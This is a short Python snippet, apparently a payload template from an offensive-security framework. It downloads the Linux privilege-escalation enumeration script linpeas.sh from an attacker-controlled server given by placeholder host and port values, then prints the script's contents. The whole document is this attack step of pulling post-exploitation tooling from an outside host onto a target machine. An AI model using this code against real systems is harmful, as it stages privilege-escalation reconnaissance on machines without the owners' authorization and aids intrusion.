import urllib.request

response = urllib.request.urlopen("http://{{datastore.srvhost}}:{{datastore.srvport}}/linpeas.sh")
print(response.read().decode(response.headers.get_content_charset()))
